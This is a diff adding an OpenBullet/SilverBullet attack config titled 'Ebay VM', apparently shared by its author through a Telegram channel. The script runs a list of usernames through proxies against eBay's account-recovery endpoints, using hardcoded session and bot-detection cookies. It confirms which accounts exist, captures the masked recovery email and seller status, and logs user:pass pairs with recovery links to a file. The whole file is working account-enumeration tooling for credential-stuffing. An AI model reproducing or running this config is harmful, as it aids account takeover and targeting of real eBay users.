@@ -1,0 +1,208 @@
+[SETTINGS]
+{
+  "Name": "Ebay VM ",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2023-11-18T16:58:39.7843095+06:00",
+  "AdditionalInfo": "Join My Telegram https://t.me/officialgoldendragon",
+  "RequiredPlugins": [],
+  "Author": "@MulaBhai",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Default",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Ebay VM ",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#U FUNCTION URLEncode "<USER>" -> VAR "U" 
+
+#GET1 REQUEST GET "https://accounts.ebay.com/EnterUserInfo" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "cookie: s=CgAD4ACBk52V9MjJiZTE1NWExOGEwYTY5MDgyNTI3ZTI2ZmZmZTQxZGVN/k9Q; ak_bmsc=90C8883A8CD87C1A87D2E9ABC9F3BED1~000000000000000000000000000000~YAAQT/APF1wSABuKAQAA9BW+IhQckPofpDGsdWqV4ozMU0kgPyrfYhLoWQD9oxlTPRIgDkzbHozubtQsFLjZf/UfmqLghBTxDVW/TbcMbMJYC24dHEAvnMBa5w8JNOTcY4UAMuQasdj8Dw8tShZCBrJskVrUzMqjS8QlM+rlrJMLfDm7iMrJcgizqDyMe22ppF75icBaLfN5MpaQkZalT+Fe8J1mjE2FXuEPBEzgMsMlc/3z+4lOqJZ7CMFD3RZu4ysWpSEScSq9sVGi0/cZmIPd09uZEKE/3JA4iltdsbRAmse+4d1GtP9jhMjuGHaKeglM2h4Tx2aVWZUZvdhJDRWYg0xKnHFYbl3ZAJdsIXAPHppx+8GqO6NEjJ7hP0+6S7v2ukQzK4OW; bm_sv=090645BFBA013717C25CF6007F47FDEB~YAAQEKXcF9IcFwCKAQAA0By+IhSU1ipbVdgFdXCeQ28lntjk9TxiyzmwvEuuMjZdr8bobwdMfU7HzJ0vHBq1tivBFolFZctwkC5j9lsVJpCjXcW5KDDiJokukdCUbXywjK9yIeA2YUcy0gAAnKwkZVh0Q47xfG29mZQ5E3APrkLpnY+qZ0eLX33cVvg7MGuLCCzIEzfexl78Un1czgCBXGrforjD5T/nUkZnKx+qCRG0R2xMmkIykjU2RlstBg==~1; __ssds=2; __ssuzjsr2=a9be0cd8e; dp1=bbl/US68a87b00^; __uzmbj2=1692800000; __uzmdj2=1692800000; __uzmaj2=9f0e3ac7-bdc1-4678-aef5-72f0fe1b8332; __uzmcj2=465111067163; nonsession=BAQAAAYhF58hiAAaAADMABWbHR4A5MDAxMQDKACBoqHsAMjJiZTE1NWExOGEwYTY5MDgyNTI3ZTI2ZmZmZTQxZGUAywABZOYbCDY9ewRFYl4P3hzHLaaAoSN78kXNiQ*; __deba=i5ZbjUgODovaSeSGk18sB4BtIcWAj8Np7dXXMjjmMOnUBK4X76nlzK7H0ohjbffWXR8UW1J2_XMwSXzXGqPFGIl_9AmVFLAhaeRbfbbzXdA4ACWnTmkuaZs6LBF8v5PEaiIUwpfPYn2so3Vs6reSLg==; ds2=sotr/b9nKjzzzzzzz^; ebay=%5Esbf%3D%23000000%5Epsi%3DAvhVm6Bk%5Ejs%3D1%5E" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"111\", \"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"111\"" 
+  HEADER "sec-ch-ua-full-version: \"111.0.5563.64\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-model: \"\"" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-ch-ua-platform-version: \"10.0.0\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "You've exceeded the number of requests allowed in one day." 
+
+#csrf PARSE "<SOURCE>" LR "initCsrf\":\"" "\"," -> VAR "csrf" 
+
+#POST REQUEST POST "https://accounts.ebay.com/acctxs/init" AutoRedirect=FALSE 
+  CONTENT "identifier=<U>&srt=<csrf>&hbi=0&ru=&srcappid=&clientapptype=&pageType=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://accounts.ebay.com" 
+  HEADER "referer: https://accounts.ebay.com/acctxs/user" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"106\", \"Google Chrome\";v=\"106\", \"Not;A=Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-full-version: \"106.0.5249.119\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-ch-ua-platform-version: \"10.0.0\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" 
+  HEADER "x-ebay-requested-with: XMLHttpRequest" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "accept: /" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fr-FR,fr;q=0.9" 
+
+#POST REQUEST POST "https://accounts.ebay.com/acctxs/init" AutoRedirect=FALSE 
+  CONTENT "identifier=<U>&srt=<csrf>&hbi=0&ru=&srcappid=&clientapptype=&pageType=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: __uzma=a0c732ce-aaaf-4f99-9212-e00fff7a7c3c; __uzmb=1692019184; __uzme=5282; __ssds=2; __ssuzjsr2=a9be0cd8e; __uzmaj2=c6d22920-e1fb-49c4-94bc-e3f15c697cd9; __uzmbj2=1692019216; __gsas=ID=1f844685352bdcb2:T=1692029621:RT=1692029621:S=ALNI_MalbNAEtbFi6Pm1A-89736iNRmg8A; __gads=ID=5aefb462a4290004:T=1694690375:RT=1694690375:S=ALNI_MaAxQNikUBBdABFkGKuQKiah-N0eA; __gpi=UID=00000ca143fe2183:T=1694690375:RT=1694690375:S=ALNI_MYO7JeLGOdwbsS2sahzdsddcpwGrQ; __uzmc=7842445740086; __uzmd=1695745589; __uzmf=7f60003a6ff358-ba6d-4a3d-adf2-d36e887fef9c16920191849713726404510-c6c7c519a5d849c5457; s=CgAD4ACBlHpWVNzkwMDRhYjcxN2YwYTRkNjVjZjg4MjczZmZmOWYyYjf2dR8v; ak_bmsc=8AA19B3DE5B5F9C08BE3918FB1DECAA3~000000000000000000000000000000~YAAQzW1lX8Tsz/GKAQAAbvVR+hXOggel1JABq2MrNl+tNZjp/El1jBsEypDz7+LBx4lEAk3Pj6VVp+00uwIRpOs39MMeEVbsHpe/qYtN9nMwwOoKkgYzuYil0sl27CgtotLtqkr0ScUhnbfrqQu4myJsr1TPNDaKrDmJ4VSu07N5c5nOBZhtSMWYyKPeFHhi32oK2c5PVCGdDq9CAFwJpT6CU9cHjqp2f3DGUFMZ2kkiL18PSbYiGhebxqvBqXh30HNa0i7E+0XmAKLFdTp25RmTTqLOwQngy/eiFrl1T9PXKAQOupSqrdIhVdMGbF1Dm5U8FNx07xbgtDKsuxAZpJHKU5ab98lLz2w+TSvlJEzFr9822q2WHBIqxETajEb+PoTvDXthgEmHag==; bm_sv=C466657A2D268AD9861F4389092D72CD~YAAQO3R7XOkkV/OKAQAAAQZS+hVXwlmYmVpgejFqYj2eZPbbG/N+Xmv4QDO3pje1R/Q37JKqnDx6RaI1CUNZGu1vHNo5JF7SXbUu88bFOYGVOiEl8zkjhxJdmPfyHG3sSPCsAwlJUonbBIDL0nQ6JKL/aIEeTvguDFDZUZlqw07+v3WM7uYa6+Vw3boHJW53xt4VTQDV2OUsff4CXBA1ooIwyRusxB7fPIidOVjtO/FoYl6ZgZABH1xTrnQL9A==~1; ns1=BAQAAAYpI47hYAAaAAKUAGmb+d5wyNDAxODgzODMzLzA7MjEzMzM3NDI2MS8wOwDYAEpm/necYzY5fDYwMV4xNjc0MjIxNDE1NTUxXl4xXjN8Mnw1fDR8N3wxMV5eXjReM14xMl4xMl4yXjFeMV4wXjFeMF4xXjY0NDI0NTkwNzXRoM26TZegFe4e9KxVKlPj9vHiTw*; dp1=bu1p/YWxkYS0yODg368dfab1c^kms/in68dfab1c^pbf/%230000e000e0000081808200000066fe779c^u1f/baf68dfab1c^expt/00016955203502516600301e^bl/MAen-US68dfab1c^; nonsession=BAQAAAYpI47hYAAaAAAQACWXDliVhbGRhLTI4ODcAEAAJZv53nGFsZGEtMjg4NwAzAARm/necLERFVQBAAAlm/necYWxkYS0yODg3AJwAOGb+d5xuWStzSFoyUHJCbWRqNndWblkrc0VaMlByQTJkajZNRms0R2lENVNBcHcyZGo2eDluWStzZVE9PQCdAAhm/necMDAwMDAwMDAAygAgaN+rHDc5MDA0YWI3MTdmMGE0ZDY1Y2Y4ODI3M2ZmZjlmMmI3AMsAAWUdSyQ1AWQAB2jfqxwjMDAwMDhhnF/xS3OjdwV5d6WVPNoJbDDfW74; __deba=gSukCMY1zfmYpF1gqXyqt6M-4wjePbCshfDWMxoL1e44TNmBKyrJrL3cpFS4tAyjg4cGjQ7Ufp6d9dwzeE8Z41oYxKfkn03MkCi7mrvIRVXikMcE5sw7PxYrCLH7Z1JdihQtA1Ic06Sqh-_pzzSZaw==; __uzmdj2=1696416796; __uzmcj2=2682571864402; ebay=%5Ejs%3D1%5Esbf%3D%23000000%5Epsi%3DAUfRv%2FPI*%5E; ds2=sotr/b9nKjzzzzzzz^" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Content-Length: 246" 
+  HEADER "Origin: https://accounts.ebay.com" 
+  HEADER "Referer: https://accounts.ebay.com/EnterUserInfo" 
+  HEADER "Sec-Ch-Ua: \"Microsoft Edge\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"" 
+  HEADER "Sec-Ch-Ua-Full-Version: \"117.0.2045.47\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Sec-Ch-Ua-Model: \"\"" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Sec-Ch-Ua-Platform-Version: \"10.0.0\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47" 
+  HEADER "X-Ebay-Requested-With: XMLHttpRequest" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Oops! Something went wrong on our side." 
+    KEY "<RESPONSECODE>" Contains "400" 
+  KEYCHAIN Success OR 
+    KEY "{\"ru\":\"/acctxs/hub?id=" 
+
+PARSE "<COOKIES(dp1)>" LR "" "" -> VAR "dp1" 
+
+PARSE "<COOKIES(nonsession)>" LR "" "" -> VAR "nonsession" 
+
+PARSE "<COOKIES(__deba)>" LR "" "" -> VAR "__deba" 
+
+PARSE "<COOKIES(__uzma)>" LR "" "" -> VAR "__uzma" 
+
+PARSE "<COOKIES(__uzmb)>" LR "" "" -> VAR "__uzmb" 
+
+PARSE "<COOKIES(__uzmc)>" LR "" "" -> VAR "__uzmc" 
+
+PARSE "<COOKIES(__uzmd)>" LR "" "" -> VAR "__uzmd" 
+
+PARSE "<COOKIES(__uzme)>" LR "" "" -> VAR "__uzme" 
+
+PARSE "<COOKIES(__uzmf)>" LR "" "" -> VAR "__uzmf" 
+
+PARSE "<COOKIES(bm_sv)>" LR "" "" -> VAR "bm_sv" 
+
+#LINK PARSE "<SOURCE>" LR "{\"ru\":\"" "\"}" -> VAR "Link" "https://accounts.ebay.com" "" 
+
+#GET2 REQUEST GET "<Link>" AutoRedirect=FALSE 
+  
+  COOKIE "dp1: <dp1>" 
+  COOKIE "nonsession: <nonsession>" 
+  COOKIE "_deba: <_deba>" 
+  COOKIE "_uzma: <_uzma>" 
+  COOKIE "_uzmb: <_uzmb>" 
+  COOKIE "_uzmc: <_uzmc>" 
+  COOKIE "_uzmd: <_uzmd>" 
+  COOKIE "_uzme: <_uzme>" 
+  COOKIE "_uzmf: <_uzmf>" 
+  COOKIE "bm_sv: <bm_sv>" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "referer: https://fyp.ebay.com/EnterUserInfo" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-gpc: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<ADDRESS>" Contains "https://www.ebay.com/splashui/captcha?" 
+
+#Email PARSE "<SOURCE>" LR "id=emailWithCode-desc role=text aria-label=\"" "." CreateEmpty=FALSE -> CAP "Email" 
+
+#seller PARSE "<SOURCE>" LR "intro-header>" "</h1><p class" -> VAR "seller" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "We'll email you at" 
+    KEY "with a security code.By selecting this method, you agree to receive text or pre-recorded messages to this number. Cell charges may" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "p id=emailWithCode-desc role=text aria-label=\"We'll email you at" 
+  KEYCHAIN Custom "seller" OR 
+    KEY "Confirm your phone number<" 
+
+UTILITY File "ebay_result.txt" AppendLines "<USER>:<PASS> / <Link>" -> CAP "results1" 
+
